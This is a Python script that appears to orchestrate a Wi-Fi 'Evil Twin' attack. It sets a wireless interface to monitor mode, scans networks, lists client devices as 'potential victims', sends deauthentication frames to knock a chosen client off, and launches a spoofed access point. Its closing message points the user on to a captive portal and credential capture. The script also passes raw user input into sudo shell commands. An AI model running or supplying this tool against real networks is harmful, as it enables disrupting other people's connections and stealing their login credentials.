from deauth import send_deauth as scapy_send_deauth
from network_scanner import scan_networks as scapy_scan
import os
import time
from client_scanner import find_clients as scapy_find_clients

def clear():
    os.system("clear" if os.name == "posix" else "cls")

def select_interface():
    clear()
    print("[1] Interface Selection")
    iface = input("Enter your wireless interface (e.g., wlxc83a35c2fcb0): ").strip()
    os.system(f"sudo ip link set {iface} down")
    os.system(f"sudo iwconfig {iface} mode monitor")
    os.system(f"sudo ip link set {iface} up")
    print(f"[+] {iface} set to monitor mode.")
    return iface
def cleanup_interface(iface):
    print(f"\n[*] Reverting {iface} back to managed mode...")
    os.system(f"sudo ip link set {iface} down")
    os.system(f"sudo iwconfig {iface} mode managed")
    os.system(f"sudo ip link set {iface} up")
    print(f"[+] {iface} is back in managed mode.")

def scan_networks(iface):
    clear()
    print("[2] Scanning for Wi-Fi networks...")
    networks = scapy_scan(iface, timeout=10)
    
    if not networks:
        print("[-] No networks found.")
        retry = input("Try again? (y/n): ").strip().lower()
        if retry == 'y':
            return scan_networks(iface)
        else:
            exit("[!] Exiting.")
    
    for i, (ssid, bssid, channel) in enumerate(networks):
        print(f"{i+1}) SSID: {ssid}, BSSID: {bssid}, Channel: {channel}")
    choice = int(input("Select a network to spoof: ")) - 1
    selected = networks[choice]
    return selected[0], selected[1], selected[2]

def find_clients(iface, ssid, ap_mac):
    clear()
    print("[3] Finding potential victims...")
    clients = scapy_find_clients(iface, target_ssid=ssid, target_bssid=ap_mac, timeout=15)
    if not clients:
        print("[-] No clients found.")
        return None
    for i, mac in enumerate(clients):
        print(f"{i+1}) Client MAC: {mac}")
    choice = int(input("Select a client to deauth: ")) - 1
    return clients[choice]

import subprocess

def create_evil_twin(ssid, iface):
    clear()
    print(f"[4] Launching Evil Twin for SSID: {ssid}")
    spoofer = subprocess.Popen(["sudo", "python3", "beacon_spoofer.py", ssid, iface])
    print("[+] Beacon spoofer launched in background.")
    print("[*] Press Enter when you're ready to stop the beacon and continue...")
    input()
    # TODO Terminate the beacon spoofer
    try:
        spoofer.terminate()
        spoofer.wait()
        print("[+] Beacon spoofer terminated.")
    except Exception as e:
        print(f"[!] Failed to terminate spoofer: {e}")

def send_deauth(victim_mac, ap_mac, iface):
    clear()
    print(f"[5] Sending deauth to {victim_mac} from AP {ap_mac}")
    scapy_send_deauth(victim_mac, ap_mac, iface)

def main():
    iface = select_interface()
    try:
        ssid, ap_mac, channel = scan_networks(iface)
        victim_mac = find_clients(iface, ssid, ap_mac)
        if victim_mac:
            send_deauth(victim_mac, ap_mac, iface)
        else:
            print("[!] No victim selected. Skipping deauth.")
        create_evil_twin(ssid, iface)
        print("[6] Evil Twin setup complete. Proceed with portal and credential capture...")
    finally:
        cleanup_interface(iface)

if __name__ == "__main__":
    main()